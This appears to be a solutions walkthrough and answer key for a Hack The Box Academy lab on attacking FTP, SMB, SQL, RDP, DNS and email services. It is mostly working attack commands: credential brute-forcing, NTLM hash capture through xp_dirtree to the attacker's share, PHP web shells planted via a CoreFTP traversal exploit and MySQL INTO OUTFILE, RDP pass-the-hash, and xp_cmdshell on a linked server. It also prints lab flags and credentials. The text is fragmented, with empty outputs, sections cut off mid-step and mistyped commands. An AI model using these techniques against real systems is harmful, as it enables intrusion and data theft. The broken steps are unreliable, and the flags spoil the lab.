# Attacking FTP

## Question 1

### "What port is the FTP service running on?"

After spawning the target machine, students need to launch an `Nmap` scan against it:

Code: shell

```shell
sudo nmap -p- -sV -T5 --open STMIP
```

```

```

Students will find out that `FTP` is running on port `2121`.

Answer: `2121`

# Attacking FTP

## Question 2

### "What username is available for the FTP server?"

Students first need to access the FTP server using anonymous login (i.e., use the credentials `anonymous:anonymous`, or anything for the password) and use `passive mode`:

Code: shell

```shell
ftp STMIP 2121
```

```
┌─[us-academy-1]─[10.10.14.44]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ftp 10.129.146.230 2121

```

When using the `dir` subcommand, students will find two files that they need to download to Pwnbox/`PMVPN`, prior to that, students can turn off interactive mode by issuing the `prompt` subcommand:

Code: shell

```shell
dir
prompt
mget *
```

```

```

Students at last need to use `Hydra` to bruteforce a valid username and password for the SSH service:

Code: shell

```shell
hydra -t 45 -L users.list -P passwords.list ssh://STMIP -q
```

```

```

Students will find out that the valid username and password are `robin:7iz4rnckjsduza7`.

Answer: `robin`

# Attacking FTP

## Question 3

### "Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer."

Using the SSH credentials (`robin:7iz4rnckjsduza7`) attained in the previous questions, students need to SSH into the spawned target machine and print the contents of the flag file "flag.txt":

Code: shell

```shell
ssh robin@STMIP
cat flag.txt
```

```

# Attacking SMB

## Question 1

### "What is the name of the shared folder with READ and WRITE permissions?"

After spawning the target machine, students need to use `enum4linux` or `enum4linux-ng.py` on it and notice that the share `GGJ` has mapping and listing allowed:

Code: shell

```shell

# Attacking SMB

## Question 2

### "What is the password for the username "jason"?"

Students need to use `Msfconsole` to bruteforce the password for the username `jason`, using "pws.list" that can be obtained from the [module's resources](https://academy.hackthebox.com/storage/resources/pws.zip); students will find the password of `jason` is `34c8zuNBo91!@28Bszh`:

Code: shell

```shell
msfconsole -q
use auxiliary/scanner/smb/smb_login
set rhosts STMIP
set SMBUSER jason
set PASS_FILE ./pws.list
set stop_on_success true
run
```

```

# Attacking SMB

## Question 3

### "Login as the user "jason" via SSH and find the flag.txt. Submit the contents as the answer."

Using the credentials `jason:34c8zuNBo91!@28Bszh`, students first need to use `smbclient` to access the `GGJ` share on which they will find the SSH private key of `jason`:

Code: shell

```shell
smbclient -U jason //STMIP/GGJ
```

```
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ smbclient -U jason //10.129.137.91/GGJ

Enter WORKGROUP\jason's password:

	14384136 blocks of size 1024. 9664764 blocks available
```

Subsequently, students need to download the SSH private key and then exit from the session/connection:

Code: shell

```shell
get id_rsa
exit
```

```
smb: \> get id_rsa

getting file \id_rsa of size 3381 as id_rsa (10.6 KiloBytes/sec) (average 10.6 KiloBytes/sec)
smb: \> exit
```

Students then need to set the appropriate permissions on the private key and use it to access the spawned target machine:

Code: shell

```shell
chmod 600
ssh -i id_rsa jason@STMIP
```

```

At last, students need to print the contents of the flag file "flag.txt", attaining `HTB{SMB_4TT4CKS_2349872359}`:

Code: shell

```shell

Answer: `HTB{SMB_4TT4CKS_2349872359}`

# Attacking SQL Databases

## Question 1

### "What is the password for the "mssqlsvc" user?"

Students first need to install `sqlcmd` on `Pwnbox`/`PMVPN` (if not already installed):

Code: shell

```shell
sudo apt install sqlcmd
```

```
┌─[us-academy-1]─[10.10.14.138]─[htb-ac413848@htb-kytxdmh4gu]─[~]

```

Subsequently, students need to use `sqlcmd` to connect to the SQL server on the spawned target machine with the credentials `htbduser:MSSQLAccess01!`:

Code: shell

```shell
sqlcmd -S STMIP -U htbdbuser
```

```

└──╼ [★]$ sqlcmd -S 10.129.247.219 -U htbdbuser

Password:
1>
```

In another terminal tab on Pwnbox/`PMVPN`, students need to start an SMB share with `impacket-smbserver` and utilize the flag `-smb2support`:

Code: shell

```shell
sudo impacket-smbserver share ./ -smb2support
```

```
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]

```

Afterward, using the terminal tab with the `sqlcmd` connection, students need to steal the `MSSQL` service account hash using either `xp_subdirs` or `xp_dirtree`, the latter will be used:

Code: sql

```sql
EXEC master..xp_dirtree '\\PWNIP\share'
go
```

Code: sql

```sql
1> EXEC master..xp_dirtree '\\10.10.14.138\share'
2> go

(0 rows affected)
```

Students will receive the NetNTLMv2 hash of `mssqlsvc` on the terminal tab with `impacket-smbserver` running:

```

# Attacking SQL Databases

## Question 2

### "Enumerate the "flagDB" database and submit a flag as your answer."

Students need to use `sqlcmd` to connect to the SQL server on the spawned target machine with the previously harvested credentials `mssqlsvc:princess1`:

Code: shell

```shell
sqlcmd -S STMIP -U .\\mssqlsvc
```

```
┌─[us-academy-1]─[10.10.14.138]─[htb-ac413848@htb-kytxdmh4gu]─[~]
└──╼ [★]$ sqlcmd -S 10.129.247.219 -U .\\mssqlsvc

Password:
1>
```

Subsequently, students need to use the `flagDB` database and query for the names of tables within it, finding the table `tb_flag`:

Code: sql

```sql
use flagDB
go
SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES
go
```

Code: sql

```sql
1> use flagDB
2> go
Changed database context to 'flagDB'.
1> SELECT table_name FROM flagDB.INFORMATION_SCHEMA.tables
2> go
table_name                                                                                                                      
--------------------------------------------------------------------------------------------------------------------------------
tb_flag                                                                                                                         

(1 row affected)
```

Students need to use the `SELECT *` statement on the table `tb_flag` to attain the flag `HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}`:

Code: sql

```sql
SELECT * FROM tb_flag
go
```

Code: sql

```sql
1> SELECT * FROM tb_flag 
2> go
flagvalue
----------------------------------------------------------------------------------------------------
HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}                                                                   

(1 row affected)
```

Answer: `HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}`

# Attacking RDP

## Question 1

### "What is the name of the file that was left on the desktop? (Format example: filename.txt)"

Students first need to connect to the spawned target machine using `xfreerdp` with the credentials `htb-rdp:HTBRocks!`:

Code: shell

```shell
xfreerdp /u:htb-rdp /p:HTBRocks! /v:STMIP
```

```
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]

```

Once the RDP connection is established, students will find out a file named `pentest-notes.txt` on the Desktop directory:

![[HTB Solutions/CPTS/z. images/790cd0dbb1280bed3e70c97793a839d9_MD5.jpg]]

Answer: `pentest-notes.txt`

# Attacking RDP

## Question 2

### "Which registry key needs to be changed to allow Pass the Hash with RDP protocol?"

The `DisableRestrictedAdmin` registry key needs to be changed to allow Pass the Hash with the RDP protocol:

![[HTB Solutions/CPTS/z. images/6cc785c2869c7373ebafda72a94ee990_MD5.jpg]]

Answer: `DisableRestrictedAdmin`

# Attacking RDP

## Question 3

### "Connect to the RDP with the Administrator account and submit the flag.txt as answer."

Using the same RDP session established in the first question of this section, students first need to add the the `DisableRestrictedAdmin` registry key:

Code: shell

```shell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```
C:\Users\htb-rdp>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

The operation completed successfully.
```

Students then need to open the "pentest-notes.txt" on the Desktop directory file to find the hash of the Administrator user:

![[HTB Solutions/CPTS/z. images/3e36db3527a096e7e4e76df197f672d0_MD5.jpg]]

Subsequently, students need to copy it and use it with `xfreerdp`:

Code: shell

```shell
xfreerdp /v:STMIP /pth:0E14B9D6330BF16C30B1924111104824 /u:administrator
```

```

Once the RDP connection is established, students will find the "flag.txt" file on the Desktop directory.

Answer: `HTB{RDP_P4$$_Th3_H4$#}`

# Attacking DNS

## Question 1

### "Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer."

Students first need clone the `subbrute` repository and change directories into it:

Code: shell

```shell
git clone https://github.com/TheRook/subbrute.git && cd subbrute/
```

```
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]

```

Students then need to add `STMIP` into the "resolvers.txt" file:

Code: shell

```shell
echo STMIP > resolvers.txt
```

Subsequently students need to use `subbrute`:

Code: shell

```shell
python3 subbrute.py inlanefreight.htb -s /opt/useful/SecLists/Discovery/DNS/namelist.txt -r resolvers.txt
```

```
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~/subbrute]

inlanefreight.htb
helpdesk.inlanefreight.htb
hr.inlanefreight.htb
ns.inlanefreight.htb
```

Students then need to perform a zone transfer and `grep` for the TXT record to find the flag:

Code: shell

```shell
dig axfr hr.inlanefreight.htb @STMIP | grep "TXT"
```

```
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~/subbrute]

```

Answer: `HTB{LUIHNFAS2871SJK1259991}`

# Attacking Email Services

## Question 1

### "What is the available username for domain inlanefreight.htb in the SMTP server?"

Using "users.list" that can be obtained from the [module's resources](https://academy.hackthebox.com/storage/resources/users.zip), students need to use `smtp-user-enum`:

Code: shell

```shell
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t STMIP
```

```
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]

Students will find out that the username is `marlin`.

Answer: `marlin`

# Attacking Email Services

## Question 2

### "Access the email account using the user credentials that you discovered and submit the flag in the email as your answer."

Since students know that the username is `marlin`, they need to bruteforce the password using `Hydra`:

Code: shell

```shell
hydra -l marlin@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://STMIP -f
```

```

# Attacking Common Services - Easy

## Question 1

### "You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer."

After spawning the target machine, students need to launch an `Nmap` scan against it:

When using `dir` to list the files available, students will find `docs.txt` and `WebServersInfo.txt`, thus, they need to `get` them:

Code: shell

```shell
get docs.txt
get WebServersInfo.txt
bye
```

```
ftp> get docs.txt

local: docs.txt remote: docs.txt
200 PORT command successful
150 RETR command started
226 Transfer Complete
55 bytes received in 0.00 secs (135.2920 kB/s)
ftp> get WebServersInfo.txt
local: WebServersInfo.txt remote: WebServersInfo.txt
200 PORT command successful
150 RETR command started
226 Transfer Complete
255 bytes received in 0.00 secs (747.8181 kB/s)
```

When checking out the contents of `WebServersInfo.txt`, students will notice that the spawned target uses `CoreFTP`, and that the `Apache` directory is at `C:\xampp\htdocs\`:

Code: shell

```shell
awk 1 WebServersInfo.txt
```

```

Since students have the credentials `fiona:987654321`, they need to mirror/copy the `windows/remote/50652.txt` exploit:

Code: shell

```shell
searchsploit -x windows/remote/50652.txt
```

```

# Exploit Title: CoreFTP Server build 725 - Directory Traversal (Authenticated)
# Date: 08/01/2022
# Exploit Author: LiamInfosec
# Vendor Homepage: http://coreftp.com/
# Version: build 725 and below
# Tested on: Windows 10
# CVE : CVE-2022-22836

# Description:

CoreFTP Server before 727 allows directory traversal (for file creation) by an authenticated attacker via ../ in an HTTP PUT request.

# Proof of Concept:

curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

Therefore, students need to write a PHP file that contains a web shell (students can generate a random name with the command `openssh rand -hex 16`) within the `--data-binary` option, utilizing the `Apache` directory `/xampp/htdocs` (since other directories might not be allowed):

Code: shell

```shell
curl -k -X PUT -H "Host: STMIP" --basic -u fiona:987654321 --data-binary '<?php echo shell_exec($_GET["c"]);?>' --path-as-is https://STMIP/../../../../../../xampp/htdocs/1af271ec0935f7ccbd31dc24666f7f33.php
```

Server: Core FTP HTTP Server
Accept-Ranges: bytes
Connection: Keep-Alive
Content-type: application/octet-stream

```

At last, students need to print out the contents of the flag file "flag.txt", which is inside the directory `C:\Users\Administrator\Desktop\`, using the web shell (utilizing HTTP and not HTTPS):

Code: shell

```shell
curl -w "\n" http://STMIP/1af271ec0935f7ccbd31dc24666f7f33.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt
```

HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
```

The second method to solve this question differs in that the web shell is not written using the `CoreFTP` exploit but rather via `MySQL`. With the attained `fiona:987654321` credentials, students need to connect to `MySQL` server on the spawned target:

Code: shell

```shell
mysql -u fiona -p987654321 -h STMIP
```

```

Subsequently, to check whether files can be read and written, students need to query for the value of the global variable `secure_file_priv`, finding it to be empty, therefore, files can be read and written:

Code: shell

```shell
show variables like "secure_file_priv";
```

```
MariaDB [(none)]> show variables like "secure_file_priv";

```

Students need to write a PHP file that contains a web shell (students can generate a random name with the command `openssh rand -hex 16`) with the statement `SELECT ... INTO OUTFILE`, utilizing the `Apache` directory `/xampp/htdocs`:

Code: sql

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdocs/90957b76a1f20de2b13c5bcb2d05b5cf.php';
```

```
MariaDB [(none)]> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdocs/90957b76a1f20de2b13c5bcb2d05b5cf.php';

Query OK, 1 row affected (0.015 sec)
```

Then, students need to print out the contents of the flag file "flag.txt", which is inside the directory `C:\Users\Administrator\Desktop\`, using the web shell (utilizing HTTP and not HTTPS):

Code: shell

```shell
curl -w "\n" http://STMIP/90957b76a1f20de2b13c5bcb2d05b5cf.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt

Answer: `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}`

# Attacking Common Services - Medium

## Question 1

### "Assess the target server and find the the flag.txt file. Submit the contents of this file as your answer."

After spawning the target machine, students need to launch an `Nmap` scan against it:

Code: shell

```shell
nmap -A STMIP
```

```
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]

```

Students will notice that there is a DNS server running, therefore, they need to attempt a zone transfer with `dig`:

Code: shell

```shell
dig AXFR inlanefreight.htb @STMIP
```

```
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]

```

Subsequently, students need to add the vHost `int-ftp.inlanefreight.htb` (this can be easily known as the section says "From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.") into `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP int-ftp.inlanefreight.htb" >> /etc/hosts'
```

```
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.183.208 int-ftp.inlanefreight.htb" >> /etc/hosts'
```

Launching an `Nmap` scan agains `int-ftp.inlanefreight.htb`, students will find that port 30021 runs `ProFTPD`:

```
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-rureq65obq]─[~]

When attempting to use anonymous FTP login (i.e., `anonymous` for username and anything for password) on port 30021, students will notice that they can login successfully:

Code: shell

```shell
ftp int-ftp.inlanefreight.htb 30021
```

```

```

Listing directories and files with `ls`, students will notice that there is a directory by the name `simon`:

Code: shell

```shell
ls
```

```
ftp> ls

200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon

```

After moving directories into `simon`, students need to `get` the file "mynotes.txt":

Code: shell

```shell
cd simon
get mynotes.txt
bye
```

```
ftp> cd simon

250 CWD command successful
ftp> get mynotes.txt

```

Checking the contents of the file "mynotes.txt", students will notice that it contains a possible wordlist of passwords, thus, they need to use it to bruteforce the password for the user `simon` on the `POP3` service, finding the credentials `simon:8Ns8j1b!23hs4921smHzwn`:

Code: shell

```shell
hydra -l simon -P mynotes.txt pop3://STMIP

Students need to save the SSH private key into a file, after removing the newline characters with `sed` (students also need to fix the header and footer so that they are only on one line, alternatively, students can paste in the key without the header and footer into [samltool](https://www.samltool.com/format_privatekey.php) to get it formatted properly):

Before utilizing the private key, students first need to change its permissions so that it is 600:

Code: shell

```shell
chmod 600 id_rsa
```

```

└──╼ [★]$ chmod 600 id_rsa
```

At last, students need to use the private key to connect to the SSH service on the spawned target, using the username `simon`, and then printing out the flag file "flag.txt":

Code: shell

```shell

## Question 1

### "What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)"

After spawning the target machine, students need to launch an `Nmap` scan against it:

Code: shell

```shell
nmap -A -Pn STMIP
```

```

Students will notice that the SMB service is open on port 445, therefore, they need to list the shares it has using `smbclient`:

```shell
smbclient -N -L STMIP
```
```

```

Thereafter, students need to connect to the `Home` share and list the directories within it:

```shell
smbclient -N //STMIP/Home
```
```

Within the `IT` directory, there are three other directories, which are `Fiona`, `John`, and `Simon`, and within each directory, there are files that students need to `get` to use in the subsequent questions:

```shell
cd IT/Fiona\
get creds.txt
cd ../Simon\
get random.txt
cd ../John\
prompt
mget *
```
```
smb: \> cd IT\Fiona\
smb: \IT\Fiona\> get creds.txt 
getting file \IT\Fiona\creds.txt of size 118 as creds.txt (2.9 KiloBytes/sec) (average 2.9 KiloBytes/sec)
smb: \IT\Fiona\> cd ../Simon\
smb: \IT\Simon\> get random.txt
getting file \IT\Simon\random.txt of size 94 as random.txt (2.4 KiloBytes/sec) (average 2.6 KiloBytes/sec)
smb: \IT\Simon\> cd ../John\
smb: \IT\John\> prompt

getting file \IT\John\secrets.txt of size 99 as secrets.txt (2.4 KiloBytes/sec) (average 2.8 KiloBytes/sec)
```

The file that was retrieved from the user `simon` is `random.txt`.

Answer: `random.txt`

# Attacking Common Services - Hard

## Question 2

### "Enumerate the target and find a password for the user Fiona. What is her password?"

From the previous question, students have attained the files `creds.txt`, `secrets.txt`, and `random.txt`, which all seem to contain potential passwords, therefore, students need to combine all of the files into one:

```shell
cat creds.txt secrets.txt random.txt > passwords.txt
```
```
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-qnhsqvzyaq]─[~]
└──╼ [★]$ cat creds.txt secrets.txt random.txt > passwords.txt
```

Then, with the generated passwords wordlist, students need to use `crackmapexec` to bruteforce the password of the user `fiona` on SMB:

```shell
sudo cme smb STMIP -u fiona -p passwords.txt
```
```

```

Students will attain the password `48Ns72!bns74@S84NNNSl`.

Answer: `48Ns72!bns74@S84NNNSl`

# Attacking Common Services - Hard

## Question 3

### "Once logged in, what other user can we compromise to gain admin privileges?"

Using the previously attained credentials `fiona:48Ns72!bns74@S84NNNSl`, students need to connect to spawned target utilizing `xfreerdp` and then open PowerShell:

```
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-qnhsqvzyaq]─[~]

<SNIP>
```

![[HTB Solutions/CPTS/z. images/46588f06e3a6b4c924c78106359f500b_MD5.jpg]]

Thereafter, students need to connect to the default MSSQL instance by using Windows Authentication mode, providing the name of the computer `WIN-HARD` for the `-S` option:

```powershell
SQLCMD.EXE -S WIN-HARD
```
```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Fiona> SQLCMD.EXE -S WIN-HARD
1>
```

Subsequently, students need to identify users that can be impersonated as, finding `john` and `simon`:

```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
GO
```
```
1> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
2> GO

name
-------------
john
simon

(2 rows affected)
```

The answer will be the user `john`.

Answer: `john`

# Attacking Common Services - Hard

## Question 4

### "Submit the contents of the flag.txt file on the Administrator Desktop."

Using the same PowerShell session that is running `SQLCMD.exe` from the previous question, students need to query for `linked servers` from the `sysservers` table, finding one named `LOCAL.TEST.LINKED.SRV` (1 for `isremote` implies that the server is a `remote` one, while 0 implies that it is a `linked` one):

```sql
SELECT srvname, isremote FROM sysservers
GO
```
```
1> SELECT srvname, isremote FROM sysservers
2> GO
srvname                           isremote
--------------------------------- --------
WINSRV02\SQLEXPRESS                1
LOCAL.TEST.LINKED.SRV              0

(2 rows affected)
```

From the previous question, students know that they can impersonate the user `john`, therefore, they need to check if `john` can connect to `LOCAL.TEST.LINKED.SRV` as a `sysadmin`:

```sql
EXECUTE AS LOGIN = 'john'
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
GO
```
```
1> EXECUTE AS LOGIN = 'john'
2> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
3> GO

WINSRV02\SQLEXPRESS Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23

        testadmin 1

(1 rows affected)
```

From the output, students know that `john` can connect to `LOCAL.TEST.LINKED.SRV` as the `sysadmin` user `testadmin`. Thus, with `john` being a `sysadmin`, students can enable `xp_cmdshell` on `LOCAL.TEST.LINKED.SRV` so that they can run commands afterward:

```sql
EXECUTE('EXECUTE sp_configure ''show advanced options'', 1;RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
GO
```
```
1> EXECUTE('EXECUTE sp_configure ''show advanced options'', 1;RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
2> GO

Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

At last, students need to print out the contents of the flag file "flag.txt", which is under the `c:\users\administrator\desktop\` directory, finding it to be `HTB{46u$!n9_l!nk3d_$3rv3r$}`:

```sql
EXECUTE('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
GO
```
```
1> EXECUTE('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
2> GO

output
---------------------------------------------
HTB{46u$!n9_l!nk3d_$3rv3r$}
NULL

(2 rows affected)
```

Answer: `HTB{46u$!n9_l!nk3d_$3rv3r$}`
